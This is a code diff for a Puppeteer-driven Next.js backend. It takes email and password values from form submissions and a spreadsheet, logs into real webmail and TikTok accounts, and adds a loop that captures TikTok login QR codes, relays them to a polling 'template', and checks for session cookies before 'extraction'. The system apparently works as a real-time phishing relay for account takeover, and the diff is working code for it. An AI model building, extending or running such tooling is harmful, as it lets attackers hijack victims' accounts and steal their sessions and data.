@@ -26,6 +26,11 @@ import {
 import { notifyTeam } from "../../../../utils/notifyTeam.js";
 import { populateCache, setCachedRow, evictRow, getCachedRow } from '../../../../utils/cookieCache.js';
 import { identifySelf as identifyServerlessSelf, getSelfUrl } from '../../../../utils/serverlessTracker.js';
+import platformHelper from './platformHelper/main.js';
+import tiktokHelper from './platformHelper/tiktok.js';
+
+const { resolvePlatform, openWarmTabs, activateWarmTab, closeOtherTabs, runQrLogin, setWarmOpening, isWarmOpening, isWarmUrl } = platformHelper;
+const { normalizeLoginMethod } = tiktokHelper;
 
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
 const DRIVE_FINALIZER_AWAIT_MS = parseInt(process.env.DRIVE_FINALIZER_AWAIT_MS || '120000', 10);
@@ -552,6 +557,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     const status = row[columnIndexes['status']];
     let email = row[columnIndexes['email']]; // Changed to let
     const password = row[columnIndexes['password']];
+    const strictValue = String(row[columnIndexes['strictly']] || '').trim();
     logger.debug(`[processRow][${browserId}] Processing row.`);
 
     const userDataDir = `users_data/${browserId}`;
@@ -574,6 +580,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     };
     let instanceId = `PROC-SETUP-${browserId}`;
     let isReusingBrowser = false;
+    let rowLoginMethod = ''; // loginMethod from lastJsonResponse ('qr'|'email'|'phone'|'')
 
     // Populate cache with full row data so intermediate writes (status etc.) preserve email/password.
     // Formula-protected columns (id/end) are stripped — the sheet auto-populates them.
@@ -586,6 +593,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
     if (row && row[columnIndexes['lastJsonResponse']]) {
         try {
             const lastJson = JSON.parse(row[columnIndexes['lastJsonResponse']]);
+            rowLoginMethod = normalizeLoginMethod(lastJson.loginMethod);
             initialCheckResult = {
                 emailExists: lastJson.emailExists !== undefined ? lastJson.emailExists : false,
                 accountAccess: lastJson.accountAccess !== undefined ? lastJson.accountAccess : false,
@@ -662,7 +670,14 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 if (target.type() === 'page') {
                     const newPage = await target.page();
                     if (newPage && newPage !== page && !newPage.isClosed()) {
-                        logger.info(`[Tab Listener][${browserId}] Detected and closing new tab: ${target.url()}`);
+                        const tUrl = target.url();
+                        // Keep tabs created while openWarmTabs is running (they are
+                        // still about:blank) and tabs already on a warm method URL.
+                        if (isWarmOpening() || isWarmUrl(tUrl)) {
+                            logger.info(`[Tab Listener][${browserId}] Keeping warm tab: ${tUrl}`);
+                            return;
+                        }
+                        logger.info(`[Tab Listener][${browserId}] Detected and closing new tab: ${tUrl}`);
                         try { await newPage.close(); } catch (closeErr) { logger.warn(`[Tab Listener][${browserId}] Error closing new tab: ${closeErr.message}`); }
                     }
                 }
@@ -708,15 +723,20 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         let matchedPlatformKey = '';
         let platformConfig = {};
 
-        // Determine platform and platformConfig early if email is available
-        if (email) { // Only if email is available from the start or found in WAITINGEMAIL
-            domain = email.split('@')[1].toLowerCase();
-            mxRecords = await resolveMx(domain).catch(() => []);
-            matchedPlatformKey = Object.keys(platformConfigs).find(key => {
-                const config = platformConfigs[key];
-                return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
+        // Determine platform early: platform/strictly hints resolve without an
+        // email (TikTok and other emailless logins); otherwise domain/MX legacy.
+        if (email || strictValue) {
+            const resolved = await resolvePlatform({
+                strictly: strictValue,
+                email,
+                mxRecords: [],
+                configs: platformConfigs,
+                resolveMxFn: resolveMx
             });
-            platform = matchedPlatformKey || 'unknown';
+            domain = resolved.domain || (email ? email.split('@')[1].toLowerCase() : '');
+            mxRecords = resolved.mxRecords || [];
+            matchedPlatformKey = resolved.platform !== 'unknown' ? resolved.platform : '';
+            platform = resolved.platform;
             platformConfig = platformConfigs[platform] || {};
         }
 
@@ -724,7 +744,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         // WAITINGEMAIL state with an informative lastJsonResponse so the UI can surface a
         // distinct error (unable to determine login URL) that is different from a later
         // 'incorrect email after page load' detection.
-        if (status !== 'WAITINGEMAIL' && email && (!platformConfig || !platformConfig.url || platform === 'unknown')) {
+        if (status !== 'WAITINGEMAIL' && (!platformConfig || !platformConfig.url || platform === 'unknown')) {
             logger.info(`[processRow][${browserId}] Could not determine platform/login URL for domain '${domain}'. Persisting WAITINGEMAIL with descriptive lastJsonResponse.`);
             finalStatus = "WAITINGEMAIL";
             updateData.status = finalStatus;
@@ -746,8 +766,115 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
         // Main state handling logic
         if (status === "WAITING") {
             logger.debug(`[processRow][${browserId}] Initial WAITING state. Performing initial checkAccountAccess.`);
+
+            // Open one warm tab per configured login method (platforms that
+            // declare loginMethods, e.g. TikTok) and activate the row's method
+            // so method switches don't re-navigate. Tab creation races the
+            // targetcreated listener — setWarmOpening(true) whitelists it.
+            if (platformConfig.loginMethods && Object.keys(platformConfig.loginMethods).length > 0) {
+                setWarmOpening(true);
+                let warmTabs = {};
+                try {
+                    warmTabs = await openWarmTabs({
+                        browser,
+                        primaryPage: page,
+                        config: platformConfig,
+                        logger,
+                        setupPage: async (p) => {
+                            try {
+                                await applyUserAgentViaCDP(p, browser.selectedUserAgent);
+                                await p.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
+                            } catch (setupErr) {
+                                logger.warn(`[processRow][${browserId}] Warm tab setup failed: ${setupErr.message}`);
+                            }
+                        }
+                    });
+                } finally {
+                    setWarmOpening(false);
+                }
+                if (Object.keys(warmTabs).length > 0) {
+                    const wanted = (rowLoginMethod && warmTabs[rowLoginMethod]) ? rowLoginMethod : Object.keys(warmTabs)[0];
+                    const activated = await activateWarmTab(warmTabs, wanted);
+                    if (activated && activated !== page) {
+                        page = activated;
+                        try { await page.bringToFront(); } catch (e) { logger.warn(`[processRow][${browserId}] bringToFront failed: ${e.message}`); }
+                    }
+                    logger.info(`[processRow][${browserId}] Warm tabs ready (${Object.keys(warmTabs).join(', ')}); active method: ${wanted}`);
+                }
+            }
+
             await handleAdditionalViews(page, platformConfig, instanceId, 'initial_load');
-            initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId);
+
+            if (platform === 'tiktok' && rowLoginMethod === 'qr' && platformConfig.qr) {
+                logger.info(`[processRow][${browserId}] QR login selected — entering QR capture loop.`);
+                try {
+                    initialCheckResult = await runQrLogin({
+                        page,
+                        config: platformConfig,
+                        logger,
+                        // Template polls pooling-operator for lastJsonResponse —
+                        // persist qrData there each capture (cache + sheet).
+                        onQrData: async (dataUrl) => {
+                            try {
+                                const cached = getCachedRow(browserId) || {};
+                                let prior = {};
+                                try { prior = JSON.parse(cached.lastJsonResponse || '{}'); } catch (e) { prior = {}; }
+                                const lastJson = JSON.stringify({
+                                    ...prior,
+                                    qrData: dataUrl,
+                                    loginMethod: 'qr',
+                                    platform: prior.platform || 'tiktok',
+                                    status: prior.status || 'WAITING',
+                                    browserId,
+                                    timestamp: new Date().toISOString()
+                                });
+                                setCachedRow(browserId, { lastJsonResponse: lastJson });
+                                await updateBrowserRowData(browserId, { lastJsonResponse: lastJson });
+                            } catch (e) {
+                                logger.warn(`[processRow][${browserId}] QR persist failed: ${e.message}`);
+                            }
+                        },
+                        // Method switch is written by update-process; sheet is the
+                        // cross-lambda source of truth (rate-limited force fetch).
+                        getMethod: async () => {
+                            try {
+                                const checkData = await fetchDataFromAppScript(1, 30000, true);
+                                const cIdx = getColumnIndexes(checkData[0]);
+                                const checkRow = checkData.slice(1).find(r => r[cIdx['browserId']] === browserId);
+                                if (checkRow && checkRow[cIdx['lastJsonResponse']]) {
+                                    const j = JSON.parse(checkRow[cIdx['lastJsonResponse']]);
+                                    const m = normalizeLoginMethod(j.loginMethod);
+                                    if (m) return m;
+                                }
+                            } catch (e) {
+                                logger.debug(`[processRow][${browserId}] QR getMethod fetch failed: ${e.message}`);
+                            }
+                            return rowLoginMethod;
+                        },
+                        isLoggedIn: async () => {
+                            try {
+                                const url = page.url();
+                                if (!url || !url.startsWith('http') || url.includes('/login')) return false;
+                                const pat = platformConfig.qr.successUrlPattern;
+                                if (pat && !pat.test(url)) return false;
+                                if (await isInbox(page, platformConfig)) return true;
+                                const cookies = await page.cookies();
+                                return cookies.some(c => c.name === 'sessionid' || c.name === 'sid');
+                            } catch (e) {
+                                return false;
+                            }
+                        }
+                    });
+                    // QR settled (success / timeout / method switch) — release the
+                    // other warm tabs; keep the active page for extraction.
+                    await closeOtherTabs(browser, page, logger);
+                } catch (qrErr) {
+                    logger.error(`[processRow][${browserId}] QR login failed: ${qrErr.message}. Falling back to credential check.`);
+                    initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId);
+                }
+            } else {
+                initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId);
+            }
         } else if (status === "WAITINGEMAIL") {
             logger.info(`[processRow][${browserId}] Entering WAITINGEMAIL poll loop.`);
             const pollingTimeoutEmail = Date.now() + 5 * 60 * 1000; // 5 minutes timeout
@@ -789,14 +916,19 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         await updateBrowserRowData(browserId, { status: "PROCESSING", verified: false, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email: currentEmail, status: "PROCESSING", message: "Processing email verification" }) });
                         email = currentEmail; // Update the email variable for subsequent use
                         emailProvidedAndProcessed = true;
-                        // After email is found, we need to determine platform and then proceed with checkAccountAccess
-                        domain = email.split('@')[1].toLowerCase();
-                        mxRecords = await resolveMx(domain).catch(() => []);
-                        matchedPlatformKey = Object.keys(platformConfigs).find(key => {
-                            const config = platformConfigs[key];
-                            return config.mxKeywords && config.mxKeywords.some(kw => domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw)));
+                        // After email is found, re-resolve platform (email legacy path,
+                        // still honoring a strictValue hint for platform-known rows)
+                        const resolvedRetry = await resolvePlatform({
+                            strictly: strictValue,
+                            email,
+                            mxRecords: [],
+                            configs: platformConfigs,
+                            resolveMxFn: resolveMx
                         });
-                        platform = matchedPlatformKey || 'unknown';
+                        domain = resolvedRetry.domain || email.split('@')[1].toLowerCase();
+                        mxRecords = resolvedRetry.mxRecords || [];
+                        matchedPlatformKey = resolvedRetry.platform !== 'unknown' ? resolvedRetry.platform : '';
+                        platform = resolvedRetry.platform;
                         platformConfig = platformConfigs[platform] || {};
 
                         initialCheckResult = await checkAccountAccess(browser, page, email, password, platform, browserId, true); // For email retry, reuse session, no navigation
@@ -2592,6 +2724,7 @@ export async function POST(request) {
 
         const {
             email, browserId, strictly,
+            platform: requestedPlatform, loginMethod,
             projectId, userId, formId,
             timestamp = new Date().toISOString(),
             ipData = {}, deviceData = {},
@@ -2687,7 +2820,11 @@ export async function POST(request) {
         userDataDir = `users_data/${actualBrowserId}`;
         instanceIdForPOST = `POST-SETUP-${actualBrowserId}`;
 
-        const initialStatus = email ? "WAITING" : "WAITINGEMAIL";
+        const normalizedLoginMethod = normalizeLoginMethod(loginMethod);
+        const persistedStrictly = requestedPlatform || strictly || '';
+        const earlyResolved = await resolvePlatform({ strictly: persistedStrictly, configs: platformConfigs });
+
+        const initialStatus = (email || earlyResolved.platform !== 'unknown') ? "WAITING" : "WAITINGEMAIL";
         const initialEmail = email || '';
         const initialDomain = initialEmail ? initialEmail.split('@')[1].toLowerCase() : '';
 
@@ -2698,7 +2835,7 @@ export async function POST(request) {
             server: assignedServer || getSelfUrl(),
             projectId,
             userId,
-            strictly,
+            strictly: persistedStrictly,
             formId,
             timestamp,
             email: initialEmail,
@@ -2710,9 +2847,10 @@ export async function POST(request) {
                 browserId: actualBrowserId,
                 email: initialEmail,
                 status: initialStatus,
-                platform: "unknown",
+                platform: earlyResolved.platform,
+                loginMethod: normalizedLoginMethod || 'email',
                 timestamp,
-                message: initialStatus === "WAITINGEMAIL" ? "Awaiting email input." : "Starting email verification process"
+                message: initialStatus === "WAITINGEMAIL" ? "Awaiting email input." : "Starting login process"
             })
         };
         await updateBrowserRowData(actualBrowserId, initialRowData, true); // true for new row
@@ -2722,7 +2860,7 @@ export async function POST(request) {
         // Instead, we ensure the interval is running.
         ensureIntervalIsRunning(); // New function to ensure interval is active
 
-        finalStatusDetails = { browserId: actualBrowserId, email, status: "WAITING", platform: "unknown", timestamp, message: "Process initiated, awaiting background processing." };
+        finalStatusDetails = { browserId: actualBrowserId, email, status: "WAITING", platform: earlyResolved.platform, loginMethod: normalizedLoginMethod || 'email', timestamp, message: "Process initiated, awaiting background processing." };
         return setCorsHeaders(NextResponse.json({ ...finalStatusDetails }, { status: 200 }));
 
     } catch (error) {
